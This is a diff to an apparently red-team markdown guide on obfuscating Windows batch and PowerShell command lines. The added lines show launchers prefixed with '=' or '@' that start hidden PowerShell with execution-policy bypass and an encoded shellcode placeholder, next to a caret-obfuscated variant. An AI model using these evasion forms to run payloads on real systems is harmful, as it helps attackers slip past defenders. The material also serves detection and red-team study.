@@ -35,6 +35,12 @@ The above string can be obfuscated using the **batch special caracter: ^** <br /
 
       cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode
 
+- Any formula under the batch interpreter can be start with the follow special caracters: **@** or **=**
+
+      =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+
+      @cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+
 ---
 
 - String command to obfuscate<br />
@@ -243,6 +249,10 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 <br /><br /><br />
 
 
+### Special thanks to:
+**@404death** **@Wandoelmo Silva**
+
+
 **Author: r00t-3xp10it**<br />
-**If you know more of this technics, fell free to report ^_^**<br />
+**If you know more of this technics, fell free to report them ^_^**<br />
 # Suspicious Shell Activity (red team) @2018
